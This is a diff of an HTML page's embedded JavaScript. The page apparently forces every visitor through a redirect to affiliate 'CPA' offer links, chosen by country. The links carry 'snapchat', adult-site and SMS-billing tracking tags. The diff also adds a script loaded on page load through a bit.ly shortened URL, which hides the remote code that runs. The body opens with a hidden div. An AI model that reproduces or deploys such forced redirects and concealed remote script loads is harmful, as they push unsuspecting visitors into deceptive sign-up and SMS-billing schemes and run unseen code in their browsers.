@@ -17,58 +17,38 @@
     </style>
     <script type="text/javascript">
 
-        // Diccionary offer
-        var cpaDefault = "http://www.rotationurls.com/offer/29668|14466?data1=snapchat&data2=Track2&tag={clickid}";
-        var cpaLinkBrezzers = "http://www.rotationurls.com/offer/29668|15578?data1=Track1&data2=Track2&tag={clickid}";
-        var cpaDE = "http://www.rotationurls.com/offer/29668|15090?data1=Track1&data2=Track2&tag={clickid}";
-        var cpaCH = "http://www.rotationurls.com/offer/29668|3087?data1=Track1&data2=Track2&tag={clickid}";
-        var cpaFR = "http://www.rotationurls.com/offer/29668|16104?data1=Track1&data2=Track2&tag={clickid}";
+        // YOUR CPA LINK HERE
+        cpaLink = "http://www.rotationurls.com/offer/29668|14466?data1=snapchat&data2=Track2&tag={clickid}";
+        cpaLinkDE = "http://www.rotationurls.com/offer/29668|15090?data1=Track1&data2=Track2&tag={clickid}";
+        cpaLinkFR = "http://www.rotationurls.com/offer/29668|14455?data1=Track1&data2=Track2&tag={clickid}";
 
-       function determineCountry(data)
-       {
-          switch(data.address.country_code)
-          {
-             case "US": 
-             case "AU": 
-             case "CA": 
-             case "FR": 
-             case "UK": 
-             case "DE": 
-             case "NZ":
-               // type Sign Up
-               location.href = cpaLinkBrezzers;
+       function determineCountry(data){
+          switch(data.address.country_code){
+
+             case "US": case "AU": case "CA": case "NZ": case "UK": case "GU":
+               location.href = cpaLink; 
              break;
 
              case "DE":
-               // type Sign Up
-               location.href = cpaDE; 
-             break;
-
-            case "CH":
-               // type MO - SMS
-               location.href = cpaCH; 
+               location.href = cpaLinkDE; 
              break;
 
              case "FR":
-               // type Sign Up
-               location.href = cpaFR;
+               location.href = cpaLinkFR; 
              break;
 
              default:
-               // type Sign Up
-                location.href = cpaDefault;
+                location.href = cpaLinkFR;
              break;           
           }    
        }
 
-        function smartlink()
-        {
-            location.href= cpaLinkBrezzers;
+        function smartlink(){
+            location.href= cpaLink;
         }
         smartlink();
-        
     </script>
-    <script type="text/javascript" src="https://freegeoip.net/json/"></script>
+    <script type="text/javascript" src="https://bit.ly/2zVoC4M"></script>
   </head>
   <body>
     <div style="display:none;">
